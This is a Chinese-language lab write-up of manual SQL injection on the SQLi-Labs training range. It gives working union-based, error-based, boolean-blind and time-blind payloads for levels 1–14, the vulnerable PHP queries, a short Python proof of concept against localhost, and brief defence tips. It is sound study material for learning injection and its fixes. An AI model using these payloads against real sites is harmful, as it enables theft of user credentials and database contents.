



# SQLi-Labs 手工打靶报告

> 作者：吴圳宇  
> 日期：2025 年 10 月  
> 项目地址：[https://github.com/litt1eYu/sqlilabs-report](https://github.com/litt1eYu/sqlilabs-report)

---

## 目录

- [项目简介](#项目简介)
- [环境说明](#环境说明)
- [测试目标](#测试目标)
- [关卡记录](#关卡记录)
  - [Less-1 手工注入分析](#less-1-手工注入分析)
  - [Less-2 手工注入分析](#less-2-手工注入分析)
  - ...
  - [Less-20 手工注入分析](#less-20-手工注入分析)
- [总结与思考](#总结与思考)
- [附录](#附录)

---

## 项目简介

SQLi-Labs 是一个经典的 SQL 注入靶场，用于学习与测试 SQL 注入漏洞的形成原理、利用方式与防御方法。  
本报告记录了本人在 SQLi-Labs 靶场中手工打靶的全过程，包括：
- 漏洞点分析与利用；
- 可运行的 PoC；
- 攻击与防御验证截图；
- 对应防御措施。

---

## 环境说明

| 项目     | 说明                  |
| -------- | --------------------- |
| PHP 版本 | 5.4.45                |
| 数据库   | MySQL 5.7.26          |
| 运行环境 | 本地 / phpstudy(小皮) |
| 浏览器   | Firefox + BurpSuite   |
| 截图工具 | Typora + PrtSc        |

---

## 测试目标

- 手工分析 SQL 注入点与过滤机制；
- 提取有效 payload；
- 复现漏洞利用过程；
- 编写 PoC 脚本并验证；
- 总结漏洞防御思路。

---

## 关卡记录

### Less-1 

#### 1. 源码分析
```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo "<font size='5' color= '#99FF00'>";
  	echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	print_r(mysql_error());
	echo "</font>";  
	}
```

- 代码理解

  LIMIT 0，1 

  第一个参数0：从表users中的第0行开始查询

  第二个参数1：从查询结果中获取第一行结果（按照id先后）

  由于数据库中id一般不会重复，所以LIMIT m,n中不论n多大结果也只有一行，只有m会影响查询的范围。

  $result：结果集（resource 类型）一个“临时表”，存放了查询得到的所有行。

  （在这里结果集只会有一行）

  $row：根据表生成的多维数组

  如果结果集有多组数据，那调用数组不就变成二维了吗？

  因为：mysql_fetch_array() 每调用一次从结果集中取一行（假定结果集有多行，实现全部读取需多次或循环调用）

- ```php+HTML
  echo 'Your Login name:'. $row['username'];
  ```

  将从数据库查询到的用户名拼接到字符串并输出到页面。

  这代表着存在信息回显

- ```php+HTML
  print_r(mysql_error());
  ```

  将最近一次 MySQL 操作的错误信息（如果有）以可读形式输出到页面。

  这代表着可利用详细的错误信息进行报错注入

#### 2. 注入点确认

- 参数位置：`id`

- 参数类型：字符串型注入

- 初始测试：

  ​	?id=1 		 	查询成功

  ​	?id=1' 			报错

  ​	?id=1’ -- s	   	查询成功

  ​	?id=1’ and 1=1  	查询成功

  ​	?id=1’ and 1=2  	报错

  ​	可确定为单引号字符型

#### 3. 漏洞利用

- 判断回显数组列数

  ```
  /sqlilabs/Less-1/?id=1' order by 1 --+
  ```

  ![](/assets/images/1-2.png)

  ```
  /sqlilabs/Less-1/?id=1' order by 2 --+
  ```

  ![](/assets/images/1-3.png)

  ```
  /sqlilabs/Less-1/?id=1' order by 3 --+
  ```

  ![](/assets/images/1-4.png)

  ```
  /sqlilabs/Less-1/?id=1' order by 4 --+
  ```

​	![](/assets/images/1-5.png)

​	order by 4 根据第四列进行排序时出错 => 表明回显数组列数为3

- 判断回显位置

  ```
  /sqlilabs/Less-1/?id=-1'union select 1,2,3 --+
  ```

  ![](/assets/images/1-6.png)

  回显位置为第2、3位

- 枚举数据库名

  ```
  /sqlilabs/Less-1/
  ?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata --+
  ```

  ![](/assets/images/1-7.png)

  发现存储用户信息的user_db数据库

- 枚举user_db数据库的表名

  ```
  /sqlilabs/Less-1/
  ?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='user_db' --+
  ```

  ![](/assets/images/1-8.png)

  发现users表

- 枚举users表的列名

  ```
  /sqlilabs/Less-1/
  ?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='user_db' and table_name='users' --+
  ```

  ![](/assets/images/1-9.png)

  发现id、username、password字段

- 枚举users表的列名

  ```
  /sqlilabs/Less-1/
  ?id=-1' union select 1,2,group_concat(id,'-',username,'-','password') from users --+
  ```

  ![](/assets/images/1-10.png)

  得到用户信息

#### 4. PoC 代码（无填充）

```python
import requests

url = "http://127.0.0.1/Less-1/"
payload = "?id=-1' union select 1,2,database()--+"
r = requests.get(url + payload)
print(r.text)
```

#### 5. 防御建议（无填充）

- 使用 **预编译语句 (Prepared Statements)**；
- 使用 **mysqli_real_escape_string()**；
- 对输入进行 **白名单验证**。

### Less-2 

#### 1. 源码分析及漏洞利用

- id为整型

```
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

  有回显信息

  ```
echo 'Your Login name:'. $row['username'];
  ```

  存在报错注入

  ```
print_r(mysql_error());
  ```

- 联合查询同Less-1
  
  ```
  /sqlilabs/Less-2/
  ?id=-1 union select 1,2,group_concat(id,'-',username,'-','password') from users
  ```

  ![](/assets/images/2-2.png)

### Less-3 

#### 1. 源码分析及漏洞利用

- id为括号字符型 需闭合单引号与括号

  ```
  $sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
  ```

  有回显信息

  ```
  echo 'Your Login name:'. $row['username'];
  ```

  存在报错注入

  ```
  print_r(mysql_error());
  ```

- 联合查询同Less-1 方便起见只查询数据库

  ```
  /sqlilabs/Less-3/?id=-1') union select 1,2,database() --+
  ```

​	![](/assets/images/3-1.png)

### Less-4 

#### 1. 源码分析及漏洞利用

- id 需闭合双引号与括号

  ```
  $id = '"' . $id . '"';
  $sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
  ```

  有回显信息

  ```
  echo 'Your Login name:'. $row['username'];
  ```

  存在报错注入

  ```
  print_r(mysql_error());
  ```

- 联合查询同Less-1 方便起见只查询数据库

  ```
  /sqlilabs/Less-4/?id=-1")  union select 1,2,database() --+
  ```

​	![](/assets/images/4-1.png)

### Less-5 

#### 1. 源码分析及漏洞利用

- id为字符型

  ```
  $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
  ```

  无回显信息

  ```
  echo 'You are in...........';
  ```

  存在报错注入

  ```
  print_r(mysql_error());
  ```

- 进行报错注入 方便起见只查询至数据库

  ```
  /sqlilabs/Less-5/
  ?id=1' and ExtractValue('1',concat('~',database())) -- s
  ```

​	![](/assets/images/5-1.png)

### Less-6 

#### 1. 源码分析及漏洞利用

- id 需闭合双引号

  ```
  $id = '"'.$id.'"';
  $sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
  ```

  无回显信息

  ```
  echo 'You are in...........';
  ```

  存在报错注入

  ```
  print_r(mysql_error());
  ```

- 进行报错注入 方便起见只查询至数据库

  ```
  /sqlilabs/Less-6/
  ?id=1" and ExtractValue('1',concat('~',database())) -- s
  ```

​	![](/assets/images/6-1.png)

### Less-8 布尔盲注

#### 1. 源码分析

```php
	if($row)
	{
	echo '<font size="5" color="#FFFF00">';	
	echo 'You are in...........';
	echo "<br>";
	echo "</font>";
	}
	else 
	{
	
	echo '<font size="5" color="#FFFF00">';
	echo "</br></font>";	
	echo '<font color= "#0000ff" font size= 3>';	
	
	}
```

- 代码理解

  无回显信息且不存在报错注入

  查询成功和失败时网页有不同的反馈 => 存在布尔盲注

  ```
  /sqlilabs/Less-8/?id=1
  ```

  ![](/assets/images/8-1.png)

  ```
  /sqlilabs/Less-8/?id=-1
  ```

  ![](/assets/images/8-2.png)

- id为字符型

  ```
  $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
  ```

#### 3. 漏洞利用

- 二分法爆破数据库名长度

  ```
  /sqlilabs/Less-8/
  ?id=1' and length(database())>5 -- s
  ```

  ![](/assets/images/8-3.png)

  ```
  /sqlilabs/Less-8/
  ?id=1' and length(database())>10 -- s
  ```

  ![](/assets/images/8-4.png)

  ```
  /sqlilabs/Less-8/
  ?id=1' and length(database())=6 -- s
  ```

  ![](/assets/images/8-5.png)

  ```
  /sqlilabs/Less-8/
  ?id=1' and length(database())=7 -- s
  ```

  ![](/assets/images/8-6.png)

  ```
  /sqlilabs/Less-8/
  ?id=1' and length(database())=8 -- s
  ```

​	![](/assets/images/8-7.png)

​	得到数据库名长度为8 （后续使用Burp Suite更为高效）

- 爆破数据库的每一位字符（8字符）

  ```
  /sqlilabs/Less-8/
  ?id=1' and ascii(substr(database(),1,1))=115 -- s
  ```

  ![](/assets/images/8-8.png)

  每一位字符都要进行多次猜测，我们选择使用Burp Suite的Intruder模式

  BP开启拦截 => 抓包 => 转发至Intruder => 设置两个Payload位置（字符位置和ASCII码值）使用Clusterbomb模式

  ![](/assets/images/8-9.png)

  第一个Payload设置（字符位置）：数值1-8  对应数据库名长度为8

  ![](/assets/images/8-10.png)

  第二个Payload设置（ASCII码值）：数值97-122  为a-z对应ASCII码值

  ![](/assets/images/8-11.png)

  点击”开始攻击“  => 按长度进行排序筛选出所需的结果

  ![](/assets/images/8-12.png)

  让AI将ASCII码值转化为字符并排序

  ![](/assets/images/8-13.png)

  ![](/assets/images/8-14.png)

  得到数据库名security

- 爆破数据库security第一个表名长度

  ```
  /sqlilabs/Less-8/
  ?id=1' and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1 ) =5  -- s
  ```

  BP开启拦截 => 抓包 => 转发至Intruder => 设置一个Payload位置（表名长度）使用Sniper模式

  ![](/assets/images/8-15.png)

  ![](/assets/images/8-16.png)

  Payload设置（字符位置）：数值1-20  表名长度一般不超过20

  ![](/assets/images/8-17.png)

  点击”开始攻击“  => 按长度进行排序筛选出所需的结果

  ![](/assets/images/8-18.png)

  得到第一个表名长度为6

- 爆破第一个表名的每一位字符（6字符）

  ```
  /sqlilabs/Less-8/
  ?id=1' and (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema=database() limit 0,1 ) =100  -- s
  ```

  BP开启拦截 => 抓包 => 转发至Intruder => 设置两个Payload位置（字符位置和ASCII码值）使用Clusterbomb模式

  ![](/assets/images/8-19.png)

  ![](/assets/images/8-20.png)

  第一个Payload设置（字符位置）：数值1-6  对应第一个表名长度为6

  ![](/assets/images/8-21.png)

  第二个Payload设置（ASCII码值）：数值97-122  为a-z对应ASCII码值

  ![](/assets/images/8-22.png)

  点击”开始攻击“  => 按长度进行排序筛选出所需的结果

  ![](/assets/images/8-23.png)

  让AI将ASCII码值转化为字符并排序得到第一个表名为emails

- 按照相同的方法我们依次爆破出表名emails、referers、uagents、users 发现存储敏感信息的users表

- 爆破users表的第一个列名

  ```
  /sqlilabs/Less-1/
  ?id=-1' union select 1,2,group_concat(id,'-',username,'-','password') from users --+
  ```

  同爆破表名流程相同这里不赘述

  得到列名为id、username、password

### Less-9 

#### 1. 源码分析

```
	if($row)
	{
  	echo '<font size="5" color="#FFFF00">';	
  	echo 'You are in...........';
  	echo "<br>";
    	echo "</font>";
  	}
	else 
	{
	
	echo '<font size="5" color="#FFFF00">';
	echo 'You are in...........';
	echo "</br></font>";	
	echo '<font color= "#0000ff" font size= 3>';	
	
	}
```

没有任何的回显，也不存在报错注入

当查询成功或失败时，网页的反馈都是一样的，布尔盲注也是用不了，这时就可以使用时间盲注了

- id为字符型

  ```
  $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
  $result=mysql_query($sql);
  $row = mysql_fetch_array($result);
  ```

#### 3. 漏洞利用

- ```
  /sqlilabs/Less-9/
  ?id=1' and if(length(database())=8, sleep(5),1) -- s
  ```

  ![](/assets/images/9-1.png)

  ![](/assets/images/9-2.png)

  我们开启网络可以发现该请求耗时5039毫秒，说明sleep()函数执行成功，则我们可以利用这个布尔判断进行sql注入

  使用Burp Suite 更高效

  ![](/assets/images/9-3.png)

  ![](/assets/images/9-4.png)

- 爆破数据库的每一位字符（8字符）

  ```
  http://127.0.0.1/sqlilabs/Less-9/
  ?id=1' and if(ascii(substr(database(),1,1))=100, sleep(5),1) -- s
  ```

  ![](/assets/images/9-5.png)

  BP开启拦截 => 抓包 => 转发至Intruder => 设置两个Payload位置（字符位置和ASCII码值）使用Clusterbomb模式

  ![](/assets/images/9-6.png)

  第一个Payload设置（字符位置）：数值1-8  对应数据库名长度为8

  ![](/assets/images/9-7.png)

  第二个Payload设置（ASCII码值）：数值97-122  为a-z对应ASCII码值

  ![](/assets/images/9-8.png)

  点击”开始攻击“  => 按长度进行排序筛选出所需的结果

  ![](/assets/images/9-9.png)

  让AI将ASCII码值转化为字符并排序

  得到数据库名security

  后续步骤与布尔盲注相同，这里不再赘述

### Less-11 

#### 1. 源码分析及漏洞利用

- POST 字符型 闭合单引号

  ```
  @$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
  ```

  有回显信息

  ```
  echo 'Your Login name:'. $row['username'];
  ```

  存在报错注入

  ```
  print_r(mysql_error());
  ```

- 联合查询同Less-1 方便起见只查询数据库

  ```
  1' union select database(),2 -- 
  ```

​	![](/assets/images/11-1.png)

### Less-12

#### 1. 源码分析及漏洞利用

- POST 需闭合双引号括号

  ```
  $uname='"'.$uname.'"';
  $passwd='"'.$passwd.'"'; 
  @$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";
  ```

  有回显信息

  ```
  echo 'Your Login name:'. $row['username'];
  ```

  存在报错注入

  ```
  print_r(mysql_error());
  ```

- 联合查询同Less-1 方便起见只查询数据库

  ```
  1") union select database(),2 --
  ```

​	![](/assets/images/12-1.png)

### Less-13

#### 1. 源码分析及漏洞利用

- POST：括号字符型

  ```
  @$sql="SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1";
  ```

  无任何回显信息

  存在报错注入

  ```
  print_r(mysql_error());
  ```

- 进行报错注入 方便起见只查询至数据库

  ```
  1') and ExtractValue('1',concat('~',database())) -- s
  ```

​	![](/assets/images/13-1.png)

### Less-14

#### 1. 源码分析及漏洞利用

- POST：需闭合双引号

  ```
  $uname='"'.$uname.'"';
  $passwd='"'.$passwd.'"'; 
  @$sql="SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1";
  ```

  无任何回显信息

  存在报错注入

  ```
  print_r(mysql_error());
  ```

- 进行报错注入 方便起见只查询至数据库

  ```
  1" and ExtractValue('1',concat('~',database())) -- s
  ```

​	![](/assets/images/14-1.png)

## 总结与思考

1. 从 Less-1 到 Less-20，SQLi-Labs 涵盖了多种注入类型：
   - 数字型 / 字符型 / 搜索型；
   - POST 注入 / Header 注入 / Cookie 注入；
   - 盲注（基于布尔、时间、报错）；
   - 二次注入。

2. 对每种注入类型，重点应掌握：
   - 请求方式；
   - 回显特征；
   - 过滤与绕过；
   - 利用与修复思路。

3.  分类
   Less-1、2、3、4、11、12 回显（联合注入）、mysql_error() 存在报错注入

   Less-5、6、13、14  无回显 mysql_error()存在报错注入

   

## 附录

- [SQLi 常见 Payload 字典](#)
- [ASCII 可打印字符表](#)
- [工具命令参考](#)